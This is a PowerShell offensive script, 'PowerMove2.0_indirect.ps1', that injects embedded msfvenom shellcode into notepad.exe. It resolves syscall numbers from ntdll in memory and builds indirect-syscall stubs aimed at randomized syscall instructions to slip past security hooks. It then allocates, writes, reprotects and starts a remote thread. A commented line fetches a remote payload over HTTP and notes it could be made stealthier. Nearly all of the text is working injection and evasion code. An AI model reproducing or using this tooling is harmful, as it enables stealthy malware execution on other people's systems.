###############################################################
# PowerMove2.0_indirect.ps1 Dynamic Indirect Syscall Dispacher
###############################################################

Write-Output "        ____                          __  ___               ___    ____  "
Write-Output "       / __ \____ _      _____  _____/  |/  /___ _   _____ |__ \  / __ \ "
Write-Output "      / /_/ / __ \ | /| / / _ \/ ___/ /|_/ / __ \ | / / _ \__/ / / / / / "
Write-Output "     / ____/ /_/ / |/ |/ /  __/ /  / /  / / /_/ / |/ /  __/ __/_/ /_/ /  "
Write-Output "    /_/    \____/|__/|__/\___/_/  /_/  /_/\____/|___/\___/____(_)____/   "
Write-Output "              PowerMove2.0_indirect.ps1 v0.1 - Author 10N351R"
Write-Output " "                                                                   
                                                                                                                    
### Payload

# Target process
$targetProcName = "notepad.exe"

# Local Payload (ex. msfvenom -p windows/x64/exec CMD=calc.exe)
$shellcode = @(
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
) -as [byte[]]

# Remote Payload (use '<# #>' to comment out the above or completely remove)
#$webClient = New-Object System.Net.WebClient
#$shellcode = $webClient.DownloadData("http://127.0.0.1:8080/payload.shc") # this method can be made wayyyy more stealthy


###############################################################
# Minimal Win32 helpers
###############################################################


Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class Native {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect
    );
}
"@

###############################################################
# Parse live NTDLL and build syscall table
###############################################################

function Get-SyscallTable {
    $ntdllBase = [Native]::GetModuleHandle("ntdll.dll")
    if ($ntdllBase -eq [IntPtr]::Zero) {
        throw "Failed to get ntdll base"
    }

    $base = $ntdllBase.ToInt64()
    Write-Host "         ntdll base: 0x$('{0:X}' -f $base)"

    $e_magic = [Runtime.InteropServices.Marshal]::ReadInt16($ntdllBase)
    if ($e_magic -ne 0x5A4D) {
        throw "Invalid DOS header"
    }

    $e_lfanew = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($base + 0x3C))

    $nt = $base + $e_lfanew
    $signature = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$nt)
    if ($signature -ne 0x4550) {
        throw "Invalid NT signature"
    }

    $fileHeader = $nt + 4
    $opt = $fileHeader + 20
    $magic = [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]$opt)
    if ($magic -ne 0x20B) {
        throw "Not PE64"
    }

    $dataDir = $opt + 112
    $exportRva  = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$dataDir)
    $exportSize = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($dataDir + 4))

    if ($exportRva -eq 0) {
        throw "No export table"
    }

    $exp = $base + $exportRva

    $numberOfFunctions = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp + 20))
    $numberOfNames     = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp + 24))
    $addrFunctions     = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp + 28))
    $addrNames         = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp + 32))
    $addrOrdinals      = [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp + 36))

    $table = @{}
    $syscallAddresses = @()

    # First pass: collect all syscall instruction addresses
    for ($i = 0; $i -lt $numberOfNames; $i++) {
        $nameRva = [Runtime.InteropServices.Marshal]::ReadInt32(
            [IntPtr]($base + $addrNames + ($i * 4))
        )

        $name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi(
            [IntPtr]($base + $nameRva)
        )

        if ($name -notmatch '^(Nt|Zw)') {
            continue
        }

        $ordinal = [Runtime.InteropServices.Marshal]::ReadInt16(
            [IntPtr]($base + $addrOrdinals + ($i * 2))
        )

        if ($ordinal -ge $numberOfFunctions) {
            continue
        }

        $funcRva = [Runtime.InteropServices.Marshal]::ReadInt32(
            [IntPtr]($base + $addrFunctions + ($ordinal * 4))
        )

        if ($funcRva -ge $exportRva -and $funcRva -lt ($exportRva + $exportSize)) {
            continue
        }

        $funcPtr = [IntPtr]($base + $funcRva)

        $bytes = New-Object byte[] 64
        [Runtime.InteropServices.Marshal]::Copy($funcPtr, $bytes, 0, 64)

        for ($o = 0; $o -lt 40; $o++) {
            if ($bytes[$o] -eq 0xB8) {
                $sysid = [BitConverter]::ToUInt32($bytes, $o + 1)

                for ($j = $o + 5; $j -lt 60; $j++) {
                    if ($bytes[$j] -eq 0x0F -and $bytes[$j + 1] -eq 0x05) {
                        # Store the syscall instruction address
                        $syscallInstrAddr = $base + $funcRva + $j
                        $syscallAddresses += @{
                            Address = $syscallInstrAddr
                            SyscallId = $sysid
                            FunctionName = $name
                        }
                        $table[$name] = $sysid
                        break
                    }
                }
                break
            }
        }
    }

    # Sort the addresses for easier processing
    $syscallAddresses = $syscallAddresses | Sort-Object -Property Address

    # Store the addresses globally for use in stub generation
    $Global:SyscallAddresses = $syscallAddresses

    return $table
}

###############################################################
# Dynamic Syscall Stub Builder
###############################################################

function Add-SyscallBindLog {
    param(
        [string]$Routine,
        [string]$NativeName,
        [UInt32]$SysId,
        [int]$Offset,
        [string]$Target,
        [UInt64]$TargetAddress,
        [IntPtr]$StubPtr
    )

    if ($null -eq $Global:SyscallBindLog) {
        $Global:SyscallBindLog = New-Object System.Collections.Generic.List[object]
    }

    $Global:SyscallBindLog.Add([pscustomobject]@{
        Wrapper    = $Routine
        Bind       = $NativeName
        SysId      = $SysId
        Offset     = $Offset
        Target     = $Target
        TargetAddr = ('0x{0:X}' -f $TargetAddress)
        Stub       = ('0x{0:X}' -f $StubPtr.ToInt64())
    })
}

function Show-SyscallBindLog {
    $Global:SyscallBindLog |
        Format-Table Routine, SysId, Offset, Target, TargetAddr, Stub -AutoSize
}


function New-SyscallStub {
    param(
        [Parameter(Mandatory)]
        [UInt32]$SysId,
        [string]$Routine = "",
        [string]$NativeName = ""
    )

    if (-not $Global:SyscallAddresses -or $Global:SyscallAddresses.Count -eq 0) {
        throw "No syscall addresses available. Make sure to call Get-SyscallTable first."
    }

    $currentIndex = -1

    for ($i = 0; $i -lt $Global:SyscallAddresses.Count; $i++) {
        if ($Global:SyscallAddresses[$i].SyscallId -eq $SysId) {
            $currentIndex = $i
            break
        }
    }

    if ($currentIndex -eq -1) {
        throw "Syscall ID $SysId was not found in Global:SyscallAddresses."
    }

    $offset = 7 + (Get-Random -Maximum 9)
    $targetIndex = ($currentIndex + $offset) % $Global:SyscallAddresses.Count
    $targetSyscall = $Global:SyscallAddresses[$targetIndex]

    $rawTargetAddress = $targetSyscall.Address

    if ($rawTargetAddress -is [IntPtr]) {
        $targetAddress = [UInt64]$rawTargetAddress.ToInt64()
    }
    elseif ($rawTargetAddress -is [string]) {
        $targetAddress = [UInt64]::Parse(
            $rawTargetAddress.Replace("0x", ""),
            [System.Globalization.NumberStyles]::HexNumber
        )
    }
    else {
        $targetAddress = [UInt64]$rawTargetAddress
    }

    [byte[]]$stub = @(
        0x49, 0x89, 0xCA,               # mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,   # mov eax, syscall_id
        0x49, 0xBB,                     # mov r11, imm64
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,         # target address
        0x41, 0xFF, 0xE3                # jmp r11
    )

    [BitConverter]::GetBytes($SysId).CopyTo($stub, 4)
    [BitConverter]::GetBytes([UInt64]$targetAddress).CopyTo($stub, 10)

    $size = [UIntPtr]::op_Explicit($stub.Length)

    # I have to fix this memory allocation because its RWX
    $mem = [Native]::VirtualAlloc(
        [IntPtr]::Zero,
        $size,
        0x3000,
        0x40
    )

    if ($mem -eq [IntPtr]::Zero) {
        throw "VirtualAlloc failed for syscall stub"
    }

    [Runtime.InteropServices.Marshal]::Copy($stub, 0, $mem, $stub.Length)


    Add-SyscallBindLog `
        -Routine $Routine `
        -NativeName $NativeName `
        -SysId $SysId `
        -Offset $offset `
        -Target $targetSyscall.FunctionName `
        -TargetAddress $targetAddress `
        -StubPtr $mem


    return [IntPtr]$mem
}


### HELPER FUNCTIONS

# Find PID for target process
function Find-ProcessPidViaNtQuerySystemInformation {
    param(
        [Parameter(Mandatory)]
        [string] $ProcessName,

        [UInt32] $DesiredAccess = 0x001F0FFF # PROCESS_ALL_ACCESS
    )

    $SystemProcessInformation = 5
    $returnLenPtr = [IntPtr]::Zero
    $procInfoPtr  = [IntPtr]::Zero

    try {
        $returnLenPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal(4)
        [Runtime.InteropServices.Marshal]::WriteInt32($returnLenPtr, 0)

        [void](Invoke-QuerySystemInformation `
            -SystemInformationClass $SystemProcessInformation `
            -SystemInformationPtr ([IntPtr]::Zero) `
            -SystemInformationLength 0 `
            -ReturnLengthPtr $returnLenPtr)

        $needed = [UInt32][Runtime.InteropServices.Marshal]::ReadInt32($returnLenPtr)
        if ($needed -eq 0) { return $null }

        $procInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]$needed)

        $status = Invoke-QuerySystemInformation `
            -SystemInformationClass $SystemProcessInformation `
            -SystemInformationPtr $procInfoPtr `
            -SystemInformationLength $needed `
            -ReturnLengthPtr $returnLenPtr

        if ($status -ne 0) {
            Write-Host ("[!] NtQuerySystemInformation failed: 0x{0:X8}" -f $status)
            return $null
        }

        if ([IntPtr]::Size -eq 8) {
            $ImageNameLengthOffset = 0x38
            $ImageNameBufferOffset = 0x40
            $UniqueProcessIdOffset = 0x50
        }
        else {
            $ImageNameLengthOffset = 0x38
            $ImageNameBufferOffset = 0x3C
            $UniqueProcessIdOffset = 0x44
        }

        $current = $procInfoPtr

        while ($true) {
            $nextEntryOffset = [Runtime.InteropServices.Marshal]::ReadInt32($current, 0)

            $imageNameLength = [Runtime.InteropServices.Marshal]::ReadInt16(
                $current,
                $ImageNameLengthOffset
            )

            $imageNameBuffer = [Runtime.InteropServices.Marshal]::ReadIntPtr(
                $current,
                $ImageNameBufferOffset
            )

            if ($imageNameLength -gt 0 -and $imageNameBuffer -ne [IntPtr]::Zero) {
                $imageName = [Runtime.InteropServices.Marshal]::PtrToStringUni(
                    $imageNameBuffer,
                    $imageNameLength / 2
                )

                if ($imageName -ieq $ProcessName) {
                    $pidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr(
                        $current,
                        $UniqueProcessIdOffset
                    )

                    $targetPid = [UInt32]$pidPtr.ToInt64()

                    $hProcessPtr         = [IntPtr]::Zero
                    $clientIdPtr         = [IntPtr]::Zero
                    $objectAttributesPtr = [IntPtr]::Zero

                    try {
                        # PHANDLE ProcessHandle
                        $hProcessPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
                        [Runtime.InteropServices.Marshal]::WriteIntPtr($hProcessPtr, [IntPtr]::Zero)

                        # CLIENT_ID
                        # typedef struct _CLIENT_ID {
                        #     HANDLE UniqueProcess;
                        #     HANDLE UniqueThread;
                        # } CLIENT_ID;
                        $clientIdPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size * 2)
                        [Runtime.InteropServices.Marshal]::WriteIntPtr($clientIdPtr, 0, [IntPtr]$targetPid)
                        [Runtime.InteropServices.Marshal]::WriteIntPtr($clientIdPtr, [IntPtr]::Size, [IntPtr]::Zero)

                        # OBJECT_ATTRIBUTES
                        if ([IntPtr]::Size -eq 8) {
                            $objectAttributesSize = 0x30
                            $oaAttributesOffset   = 0x18
                        }
                        else {
                            $objectAttributesSize = 0x18
                            $oaAttributesOffset   = 0x0C
                        }

                        $objectAttributesPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($objectAttributesSize)

                        for ($i = 0; $i -lt $objectAttributesSize; $i++) {
                            [Runtime.InteropServices.Marshal]::WriteByte($objectAttributesPtr, $i, 0)
                        }

                        # OBJECT_ATTRIBUTES.Length
                        [Runtime.InteropServices.Marshal]::WriteInt32(
                            $objectAttributesPtr,
                            0,
                            $objectAttributesSize
                        )

                        # OBJECT_ATTRIBUTES.Attributes = 0
                        [Runtime.InteropServices.Marshal]::WriteInt32(
                            $objectAttributesPtr,
                            $oaAttributesOffset,
                            0
                        )

                        $ntStatus = Invoke-OpenProcess `
                            -ProcessHandlePtr $hProcessPtr `
                            -DesiredAccess $DesiredAccess `
                            -ObjectAttributesPtr $objectAttributesPtr `
                            -ClientIdPtr $clientIdPtr

                        $hProcess = [Runtime.InteropServices.Marshal]::ReadIntPtr($hProcessPtr)

                        if ($ntStatus -ne 0 -or $hProcess -eq [IntPtr]::Zero) {
                            Write-Host ("[!] Found PID {0} but NtOpenProcess failed: 0x{1:X8}" -f $targetPid, $ntStatus)
                        }

                        return [PSCustomObject]@{
                            ProcessName = $imageName
                            Pid         = $targetPid
                            Handle      = $hProcess
                            NtStatus    = $ntStatus
                        }
                    }
                    finally {
                        if ($hProcessPtr -ne [IntPtr]::Zero) {
                            [Runtime.InteropServices.Marshal]::FreeHGlobal($hProcessPtr)
                        }

                        if ($clientIdPtr -ne [IntPtr]::Zero) {
                            [Runtime.InteropServices.Marshal]::FreeHGlobal($clientIdPtr)
                        }

                        if ($objectAttributesPtr -ne [IntPtr]::Zero) {
                            [Runtime.InteropServices.Marshal]::FreeHGlobal($objectAttributesPtr)
                        }
                    }
                }
            }

            if ($nextEntryOffset -eq 0) {
                break
            }

            $current = [IntPtr]($current.ToInt64() + $nextEntryOffset)
        }

        return $null
    }
    finally {
        if ($returnLenPtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($returnLenPtr)
        }

        if ($procInfoPtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($procInfoPtr)
        }
    }
}

# Injector
function inject {
    param(
        [IntPtr]$ProcessHandle,
        [byte[]]$Payload,
        [UInt64]$PayloadSize
    )

    # Variables
    $ntStatus = 0
    $baseAddressPtr = [IntPtr]::Zero
    $oldProtection = 0
    $size = $PayloadSize
    $bytesWrittenPtr = [IntPtr]::Zero
    $threadHandlePtr = [IntPtr]::Zero
    $payloadBuffer = [IntPtr]::Zero
    $oldProtectPtr = [IntPtr]::Zero

    try {
        # Allocating memory
        $baseAddressPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [Runtime.InteropServices.Marshal]::WriteIntPtr($baseAddressPtr, [IntPtr]::Zero)

        $sizePtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([UInt64]::Size)
        [Runtime.InteropServices.Marshal]::WriteInt64($sizePtr, $size)

        $ntStatus = Invoke-AllocateVirtualMemory `
            -ProcessHandle $ProcessHandle `
            -BaseAddressPtr $baseAddressPtr `
            -ZeroBits 0 `
            -RegionSizePtr $sizePtr `
            -AllocationType 0x1000 `
            -Protect 0x40  # RW

        $baseAddress = [Runtime.InteropServices.Marshal]::ReadIntPtr($baseAddressPtr)

        if ($ntStatus -ne 0) {
            Write-Host "[ERROR] NtAllocateVirtualMemory: FAILED (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            return $false
        } else {
            Write-Host "[MEMORY] NtAllocateVirtualMemory: SUCCESS (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            Write-Host "         Base: 0x$($baseAddress.ToString("X")) | Size: $size bytes"
        }

        # Writing the payload
        $payloadBuffer = [Runtime.InteropServices.Marshal]::AllocHGlobal($Payload.Length)
        [Runtime.InteropServices.Marshal]::Copy($Payload, 0, $payloadBuffer, $Payload.Length)

        $bytesWrittenPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([UInt32]::Size)
        [Runtime.InteropServices.Marshal]::WriteInt32($bytesWrittenPtr, 0)

        $ntStatus = Invoke-WriteVirtualMemory `
            -ProcessHandle $ProcessHandle `
            -BaseAddress $baseAddress `
            -Buffer $payloadBuffer `
            -NumberOfBytesToWrite $Payload.Length `
            -NumberOfBytesWrittenPtr $bytesWrittenPtr

        $bytesWritten = [Runtime.InteropServices.Marshal]::ReadInt32($bytesWrittenPtr)

        if ($ntStatus -ne 0 -or $bytesWritten -ne $Payload.Length) {
            Write-Host "[ERROR] NtWriteVirtualMemory: FAILED (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            Write-Host "[ERROR] Bytes Written : $bytesWritten of $($Payload.Length)"
            return $false
        } else {
            Write-Host "         NtWriteVirtualMemory: SUCCESS (NTSTATUS: 0x$($ntStatus.ToString("X8"))) | $bytesWritten bytes written"
        }

        # Changing the memory's permissions
        $baseAddressPtr2 = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [Runtime.InteropServices.Marshal]::WriteIntPtr($baseAddressPtr2, $baseAddress)

        $sizePtr2 = [Runtime.InteropServices.Marshal]::AllocHGlobal([UInt64]::Size)
        [Runtime.InteropServices.Marshal]::WriteInt64($sizePtr2, $PayloadSize)

        $oldProtectPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([UInt32]::Size)
        [Runtime.InteropServices.Marshal]::WriteInt32($oldProtectPtr, 0)

        # 0x20 is RX
        $ntStatus = Invoke-ProtectVirtualMemory `
            -ProcessHandle $ProcessHandle `
            -BaseAddressPtr $baseAddressPtr2 `
            -RegionSizePtr $sizePtr2 `
            -NewProtect 0x20 `
            -OldProtectPtr $oldProtectPtr

        if ($ntStatus -ne 0) {
            Write-Host "[ERROR] NtProtectVirtualMemory: FAILED (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            return $false
        } else {
            Write-Host "         NtProtectVirtualMemory: SUCCESS (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            Write-Host " "
        }

        # Executing the payload via thread
        Write-Host "[THREAD] Executing Thread at Entry Point 0x$($baseAddress.ToString("X")) ... "
        
        $threadHandlePtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
        [Runtime.InteropServices.Marshal]::WriteIntPtr($threadHandlePtr, [IntPtr]::Zero)

        $ntStatus = Invoke-CreateThreadEx `
            -ThreadHandlePtr $threadHandlePtr `
            -DesiredAccess 0x1F0FFF `
            -ObjectAttributes ([IntPtr]::Zero) `
            -ProcessHandle $ProcessHandle `
            -StartRoutine $baseAddress `
            -Argument ([IntPtr]::Zero) `
            -CreateFlags 0 `
            -ZeroBits ([UIntPtr]::Zero) `
            -StackSize ([UIntPtr]::Zero) `
            -MaximumStackSize ([UIntPtr]::Zero) `
            -AttributeList ([IntPtr]::Zero)

        $threadHandle = [Runtime.InteropServices.Marshal]::ReadIntPtr($threadHandlePtr)

        if ($ntStatus -ne 0) {
            Write-Host "[ERROR] NtCreateThreadEx: FAILED (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            return $false
        } else {
            Write-Host "         NtCreateThreadEx: SUCCESS (NTSTATUS: 0x$($ntStatus.ToString("X8")))"
            Write-Host "         Thread ID: $($threadHandle.ToString())"
            Write-Host " "
        }

        return $true
    }
    finally {
        # Clean up allocated memory
        if ($baseAddressPtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($baseAddressPtr)
        }
        if ($sizePtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($sizePtr)
        }
        if ($bytesWrittenPtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($bytesWrittenPtr)
        }
        if ($payloadBuffer -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($payloadBuffer)
        }
        if ($oldProtectPtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($oldProtectPtr)
        }
        if ($threadHandlePtr -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($threadHandlePtr)
        }
        if ($baseAddressPtr2 -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($baseAddressPtr2)
        }
        if ($sizePtr2 -ne [IntPtr]::Zero) {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($sizePtr2)
        }
    }
}


# Dynamic delegate type builder

function Get-DelegateType {
    param(
        [Type[]]$Parameters,
        [Type]$ReturnType = [Void]
    )

    $domain = [AppDomain]::CurrentDomain
    $asmName = New-Object System.Reflection.AssemblyName(
        "DynDelegates_$([Guid]::NewGuid().ToString('N'))"
    )

    $asm = $domain.DefineDynamicAssembly(
        $asmName,
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $mod = $asm.DefineDynamicModule('InMemoryModule', $false)

    $type = $mod.DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $ctor = $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $Parameters
    )
    $ctor.SetImplementationFlags('Runtime, Managed')

    $invoke = $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $ReturnType,
        $Parameters
    )
    $invoke.SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

###############################################################
# Registry of routines (add external calling conventions here)
###############################################################

$Global:RoutineSpecs = @{
    QueryAuxCounterFrequency = @{
        Aliases    = @("NtQueryAuxiliaryCounterFrequency", "ZwQueryAuxiliaryCounterFrequency")
        Parameters = @([IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    QueryTimerResolution = @{
        Aliases    = @("NtQueryTimerResolution", "ZwQueryTimerResolution")
        Parameters = @([IntPtr], [IntPtr], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    QuerySystemInformation = @{
        Aliases    = @("NtQuerySystemInformation", "ZwQuerySystemInformation")
        Parameters = @([UInt32], [IntPtr], [UInt32], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    AllocateVirtualMemory = @{
        Aliases    = @("NtAllocateVirtualMemory", "ZwAllocateVirtualMemory")
        Parameters = @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    WriteVirtualMemory = @{
        Aliases    = @("NtWriteVirtualMemory", "ZwWriteVirtualMemory")
        Parameters = @([IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }
    
    ProtectVirtualMemory = @{
        Aliases    = @("NtProtectVirtualMemory", "ZwProtectVirtualMemory")
        Parameters = @([IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    CreateThreadEx = @{
        Aliases    = @("NtCreateThreadEx", "ZwCreateThreadEx")
        Parameters = @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UIntPtr], [UIntPtr], [UIntPtr], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }

    OpenProcess = @{
        Aliases    = @("NtOpenProcess", "ZwOpenProcess")
        Parameters = @([IntPtr], [UInt32], [IntPtr], [IntPtr])
        ReturnType = [UInt32]
        Delegate   = $null
        SysId      = $null
        NativeName = $null
        StubPtr    = [IntPtr]::Zero
    }
}


# Resolve aliases

function Resolve-RoutineSpec {
    param(
        [hashtable]$SyscallTable,
        [hashtable]$Spec
    )

    foreach ($alias in $Spec.Aliases) {
        if ($SyscallTable.ContainsKey($alias)) {
            $Spec.NativeName = $alias
            $Spec.SysId = [UInt32]$SyscallTable[$alias]
            return $true
        }
    }

    return $false
}

# Build routine

function Bind-RoutineSpec {
    param(
        [string]$Routine,
        [hashtable]$Spec
    )

    if ($null -eq $Spec.SysId) {
        throw "Spec has no resolved syscall ID"
    }

    $stubPtr = New-SyscallStub `
        -SysId $Spec.SysId `
        -Routine $Routine `
        -NativeName $Spec.NativeName

    $delegateType = Get-DelegateType `
        -Parameters $Spec.Parameters `
        -ReturnType $Spec.ReturnType

    $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [IntPtr]$stubPtr,
        $delegateType
    )

    $Spec.StubPtr = [IntPtr]$stubPtr
    $Spec.Delegate = $delegate

}

function Initialize-RoutineRegistry {
    
    $Global:SyscallBindLog = New-Object System.Collections.Generic.List[object]
    
    Write-Host "[INIT]   Parsing live NTDLL..."
    $script:SyscallTable = Get-SyscallTable
    Write-Host "         Syscalls discovered: $($script:SyscallTable.Count)"
    Write-Host "         Building syscall table with alternative syscall instruction targets..."

    foreach ($routineName in $Global:RoutineSpecs.Keys) {
        $spec = $Global:RoutineSpecs[$routineName]

        if (-not (Resolve-RoutineSpec -SyscallTable $script:SyscallTable -Spec $spec)) {
            throw "[!] Could not resolve any alias for routine '$routineName'"
        }

        Bind-RoutineSpec -Routine $routineName -Spec $spec

        #Write-Host "[+] Bound $routineName -> $($spec.NativeName) (SysId=$($spec.SysId))"
    }
}

###############################################################
# Wrappers (add external calling conventions here)
###############################################################

function Invoke-QueryAuxCounterFrequency {
    param([IntPtr]$Buffer)

    $spec = $Global:RoutineSpecs["QueryAuxCounterFrequency"]
    return $spec.Delegate.Invoke($Buffer)
}

function Invoke-QueryTimerResolution {
    param(
        [IntPtr]$MaximumTimePtr,
        [IntPtr]$MinimumTimePtr,
        [IntPtr]$CurrentTimePtr
    )

    $spec = $Global:RoutineSpecs["QueryTimerResolution"]
    return $spec.Delegate.Invoke($MaximumTimePtr, $MinimumTimePtr, $CurrentTimePtr)
}

function Invoke-QuerySystemInformation {
    param(
        [UInt32]$SystemInformationClass,
        [IntPtr]$SystemInformationPtr,
        [UInt32]$SystemInformationLength,
        [IntPtr]$ReturnLengthPtr
    )

    $spec = $Global:RoutineSpecs["QuerySystemInformation"]

    return $spec.Delegate.Invoke(
        $SystemInformationClass,
        $SystemInformationPtr,
        $SystemInformationLength,
        $ReturnLengthPtr
    )
}

function Invoke-AllocateVirtualMemory {
    param(
        [IntPtr]$ProcessHandle,
        [IntPtr]$BaseAddressPtr,
        [IntPtr]$ZeroBitsPtr,
        [IntPtr]$RegionSizePtr,
        [UInt32]$AllocationType,
        [UInt32]$Protect
    )

    $spec = $Global:RoutineSpecs["AllocateVirtualMemory"]

    return $spec.Delegate.Invoke(
        $ProcessHandle,
        $BaseAddressPtr,
        $ZeroBitsPtr,
        $RegionSizePtr,
        $AllocationType,
        $Protect
    )
}

